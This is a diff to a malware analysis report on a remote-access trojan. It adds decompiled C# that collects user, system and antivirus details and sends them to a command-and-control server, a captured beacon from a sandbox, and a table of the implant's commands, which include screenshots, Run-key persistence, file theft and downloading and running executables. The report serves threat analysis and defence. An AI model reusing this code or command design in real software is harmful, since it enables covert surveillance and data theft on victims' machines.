@@ -77,9 +77,27 @@ public void ulhtagniasdo_start()
 }
 ```
 
-<h6>Can read the Operation System </h6>
+<h6>Once the connexion is etablish with the C2, this send the informations of user, system, sensible AV (who detect it easily) and this repertory (here from a trace of the TCP stream of an Anyrun sandbox)</h6>
+
+``` .....info=command.....ulhtagnias-info=user8....|USER-PC|admin||6>1|S.P.1.3|| ||C:\ProgramData\DeIA-WIR\.....clping=Ping.....clping=Ping```
 
 ```csharp
+private void ulhtagniasuser_info()
+{
+ string text = string.Concat(new string[]
+ {
+  this.ulhtagniasUPC.ulhtagniaslancard,"|",this.ulhtagniasUPC.ulhtagniascname,"|",
+  this.ulhtagniasUPC.ulhtagniasuname,"|",this.ulhtagniasUPC.ulhtagniasuip,"|",
+  ulhtagniasCONF.ulhtagniasOsname(),"|",this.ulhtagniasUPC.ulhtagniasapver,"|",
+  ulhtagniasCONF.ulhtagniasloadAV()
+ });
+ text += "| !ulhtagnias".Split(new char[]{'!'})[0];
+ text = text + "|" + this.ulhtagniasUPC.ulhtagniasclientNum;
+ text = text + "|" + ulhtagniasCONF.ulhtagniasget_mpath();
+ byte[] byteArray = ulhtagniasCONF.getByteArray(text);
+ this.ulhtagniaspush_data(byteArray, "ulhtagnias-info=user|ulhtagnias".Split(new char[]{'|'})[0], false);
+} 
+
 public static string ulhtagniasOsname()
 {
  string result;
@@ -88,11 +106,117 @@ public static string ulhtagniasOsname()
   OperatingSystem osversion = Environment.OSVersion;
   result = osversion.Version.Major.ToString() + ">" + osversion.Version.Minor.ToString();
  }
- catch
- {result = "6>1!ulhtagnias".Split(new char[]{'!'})[0];}
+ catch {result = "6>1!ulhtagnias".Split(new char[]{'!'})[0];}
  return result;
 }
 ```
+
+<h6>The name of PE file is used as identifier and the command by a couple {nameimplant-command}.This can perform the actions by the following commands :</h6>
+
+<p align="center">
+<table>
+  <tr>
+    <th>Command</th>
+    <th>Description</th>
+  </tr>
+  <tr>
+    <td>-procl</td>
+    <td>Get the list of process</td>
+  </tr>
+  <tr>
+    <td>-thumb</td>
+    <td>Get info of a picture</td>
+  </tr>
+  <tr>
+    <td>-clping</td>
+    <td>Check activity</td>
+  </tr>  
+  <tr>
+    <td>-putsrt</td>
+    <td>Push the persistence in a Run key </td>
+  </tr>  
+  <tr>
+    <td>-filsz</td>
+    <td>Get infos of a specific file</td>
+  </tr>
+  <tr>
+    <td>-rupth</td>
+    <td>Push the data received</td>
+  </tr>
+  <tr>
+    <td>-dowf</td>
+    <td>Save to a file the data pushed on the system</td>
+  </tr>
+  <tr>
+    <td>-endpo</td>
+    <td>Kill a process</td>
+  </tr>
+  <tr>
+    <td>-scrsz</td>
+    <td>Get the size of the screen</td>
+  </tr>
+  <tr>
+    <td>-cownar</td>
+    <td>Download and run a executable file</td>
+  </tr>
+  <tr>
+    <td>-cscreen</td>
+    <td>Get a screenshot</td>
+  </tr>
+  <tr>
+    <td>-dirs</td>
+    <td>List all the drives and directories</td>
+  </tr>
+  <tr>
+    <td>-stops</td>
+    <td>stop the mod for get periodical screenshot</td>
+  </tr>
+  <tr>
+    <td>-scren</td>
+    <td>start the mod for get periodical screenshot</td>
+  </tr>
+  <tr>
+    <td>-cnls</td>
+    <td>Allow index, send data and disable continue screenshot </td>
+  </tr>
+  <tr>
+    <td>-udlt</td>
+    <td>Download and execute an executable for remove an user ? </td>
+  </tr>
+  <tr>
+    <td>-delt</td>
+    <td>Delete a specific file</td>
+  </tr>
+  <tr>
+    <td>-listf</td>
+    <td>List files</td>
+  </tr>
+  <tr>
+    <td>-file</td>
+    <td>Get a specific file</td>
+  </tr>
+  <tr>
+    <td>-info</td>
+    <td>Get user and system infos, check if the AV is on blacklist</td>
+  </tr>
+  <tr>
+    <td>-runf</td>
+    <td>Execute a specific file</td>
+  </tr>
+  <tr>
+    <td>-dowr</td>
+    <td>Download a file on the system</td>
+  </tr>
+  <tr>
+    <td>-fldr</td>
+    <td>Get folders and go silent mod</td>
+  </tr>
+</table> 
+</p>
+
+<h6>Can read the Operation System version</h6>
+
+
 <h6></h6>
 
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
